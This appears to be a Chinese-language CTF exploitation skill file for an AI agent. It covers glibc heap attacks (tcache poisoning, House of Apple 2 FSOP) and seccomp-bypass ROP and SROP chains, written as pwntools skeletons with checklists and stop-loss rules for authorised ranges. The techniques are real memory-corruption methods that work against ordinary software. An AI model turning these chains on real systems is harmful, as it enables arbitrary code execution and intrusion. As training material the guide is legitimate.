# heap-and-sandbox.md — tcache/UAF、IO_FILE 与 seccomp ORW

> 配套 `pwn-crypto/SKILL.md`。所有脚本仅用于授权靶场；先记录 checksec、glibc 版本、sha256。
> 本文只给“可运行骨架 + 判据”，偏移一律用当前 libc/调试器复核，不抄死数字。

## 0. 堆题开局（先定版本与分配器）

```bash
ldd --version | head -1
strings -a libc.so.6 | grep -m1 'GNU C Library'
python3 - <<'PY'
from pwn import *
e = ELF('./chall', checksec=False)
print(hex(e.symbols.get('__free_hook', 0)), hex(e.symbols.get('_IO_list_all', 0)))
PY
```

| glibc | 关键变化 | 打法影响 |
|---|---|---|
| 2.26+ | tcache 引入 | 每 size 最多 7 个，LIFO，无检查 |
| 2.29+ | tcache `key` 字段 | 二次 free 需绕过 `e->key == tcache` |
| 2.32+ | safe-linking | `fd = target ^ (chunk_addr >> 12)` |
| 2.34+ | `__free_hook`/`__malloc_hook` 移除 | 改走 IO_FILE/exit_funcs/程序指针 |
| 2.35+ | 更多 IO vtable/一致性检查 | 先确认目标 libc 的 vtable 范围 |

**判据**：libc build id 或泄漏低 12 位与本地 libc 吻合；能说出 tcache count、safe-linking 是否启用。

## 1. tcache / UAF 骨架

```python
from pwn import *
context.binary = elf = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process(elf.path)

def add(size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size> ', str(size).encode())
    p.sendafter(b'data> ', data)

def free(i):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx> ', str(i).encode())

def edit(i, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx> ', str(i).encode())
    p.sendafter(b'data> ', data)

def show(i):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx> ', str(i).encode())
    return p.recvline().strip()
```

### 1.1 泄漏顺序

1. **堆**：释放两个同 size chunk，读第一个的 `fd`；2.32+ 先解码 `fd ^ (chunk >> 12)`。
2. **libc**：填满对应 tcache（7 个），再释放一个进 unsorted bin，读 `fd/bk`；
   `main_arena` 偏移用 `libc.symbols` 或 gdb 的 `p &main_arena` 确认。
3. **栈**：libc 基址 + `environ` 偏移，读 `environ` 得栈地址；再回栈找返回地址。

```python
def dec(x, where):  # 2.32+
    return x ^ (where >> 12)
def enc(x, where):
    return x ^ (where >> 12)
```

**判据**：泄漏值页对齐；`vmmap` 中对应段名正确；解码后的 fd 是堆地址/0。

### 1.2 tcache poison

```python
# 1) 同一 chunk 入链两次：free(a); edit(a, ...); free(a)
#    2.29+ 先清 key，且确认 count < 7
# 2) 改 fd 指向 target（按 0x10 对齐）
edit(0, p64(enc(target, chunk_addr)))
add(size)                 # 取回原 chunk
add(size)                 # malloc 返回 target
```

- target 优先级：`__free_hook`（<2.34）→ `_IO_list_all`/`exit_funcs`（≥2.34）
  → 程序自身函数指针 → `environ` 回栈。
- 目标可写且对齐；写 `system` 时把 `"/bin/sh\0"` 放到已知 chunk。
- 2.34+ 不要找 `__free_hook`，符号不存在不是“偏移错了”。

**判据**：`malloc` 返回 `target`；`vis_heap_chunks` 能看到重复/重叠；触发后不 abort。
**失败先查**：tcache count 已满、`key` 未清、safe-linking 未编码、target 未 0x10 对齐。

## 2. IO_FILE / FSOP（2.34+ 常用）

```text
触发链：exit() -> _IO_flush_all_lockp() -> _IO_OVERFLOW(fp)
伪造：_IO_FILE_plus 在可写堆；vtable 必须落在 __libc_IO_vtables 范围
House of Apple 2：vtable = _IO_wfile_jumps
  _flags = 0
  _IO_write_ptr > _IO_write_base
  _wide_data->_IO_write_base = 0
  _wide_data->_IO_write_ptr  = 1
  _wide_data->_wide_vtable   = fake_wvt
  fake_wvt->__doallocate     = system
  _lock 指向可写零页
```

```python
# 只给字段布局；地址/偏移用当前 libc 填
fake = flat({
    0x00: 0,                          # _flags
    0x20: 0,                          # _IO_write_base
    0x28: 1,                          # _IO_write_ptr > base
    0x88: lock_addr,                  # _lock
    0xA0: wide_data_addr,             # _wide_data
    0xD8: libc.symbols['_IO_wfile_jumps'],
}, length=0xE0)
# _wide_data + 0x18/0x20 设 write_base/write_ptr；+0xE0 放 fake wide vtable
```

- 触发前把 `_IO_list_all` 指向 fake，或走 `exit_funcs` 的 `__run_exit_handlers`。
- 先确认 `_IO_wfile_jumps` 在目标 libc 中存在；不同发行版可能裁剪。
- 任何 vtable 越界都会触发 `_IO_vtable_check` abort，不要伪造到堆上。

**判据**：gdb 断在 `_IO_wfile_overflow`/`system`，`bt` 能看到 flush 链；
`p _IO_list_all` 指向伪造结构。
**失败先查**：vtable 不在合法段、`_wide_data` 未映射、`_lock` 为空、触发路径没走 flush。

## 3. seccomp 与 ORW

```bash
seccomp-tools dump ./chall
# 记录 arch、allowed syscall、参数过滤；没有工具时 strace -f 观察
```

x86_64 常用号：`read=0 write=1 open=2 close=3 mprotect=10 openat=257 sendfile=40`。
先判断 flag 是否已被父进程打开：若允许 `read`，先试 `read(3, bss, 0x100)`。

### 3.1 经典 open/read/write

```python
flag = next(libc.search(b'/flag\x00'))
bss = elf.bss() + 0x200
rop = ROP(libc)
rop.call(libc.symbols['open'], [flag, 0])
rop.call(libc.symbols['read'], [3, bss, 0x100])
rop.call(libc.symbols['write'], [1, bss, 0x100])
p.sendline(flat({OFFSET: rop.chain()}))
print(p.recvall(timeout=3))
```

### 3.2 只有 openat / 缺 pop rdx

```python
# openat(AT_FDCWD=-100, path, 0)
rop.call(libc.symbols['openat'], [-100, flag, 0])
# 缺 gadget：ret2csu 设 rdx/rsi/rdi；或 SROP
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bss
frame.rsi = frame.rdx = 0
frame.rip = syscall_ret
payload = flat({OFFSET: [syscall_ret, frame]})
```

### 3.3 允许 mprotect

```python
rop.call(libc.symbols['read'], [0, bss, 0x200])
rop.call(libc.symbols['mprotect'], [bss & ~0xfff, 0x1000, 7])
rop.call(bss)
p.sendline(flat({OFFSET: rop.chain()}) + asm(shellcraft.cat('/flag')))
```

**判据**：`strace`/seccomp 日志出现预期 `openat/read/write`（或 `open/read/write`），
输出包含 flag；shellcode 路线要看到 `mprotect(...,7)` 返回 0。
**失败先查**：fd 猜错、路径不在可写内存、`openat` 第一参数不是 -100、x32 ABI 混用。

## 4. 失败判据与止损

- 连续 3 轮同一路径无进展（泄漏不变、目标不可写、触发必 abort）→ 换路线。
- 同一目标同类动态尝试最多 2 次；第二次失败必须停下汇报。
- 只“本地偶然成功”不算通过：全新进程 ≥9/10 成功，远程有 flag/root 证据。
- 记录已排除路线：例如 “Full RELRO + 无泄漏，GOT 路线不可行”“2.34 无 free_hook”。

## 5. 证据清单

```text
checksec 四项 + glibc build id + sha256(chall/libc)
seccomp 白名单原文
泄漏值 -> 基址计算过程
每次 malloc/free 的 size/index 与堆状态截图
exploit.py 运行 10 次成功计数
flag/root 输出与会话时间
```
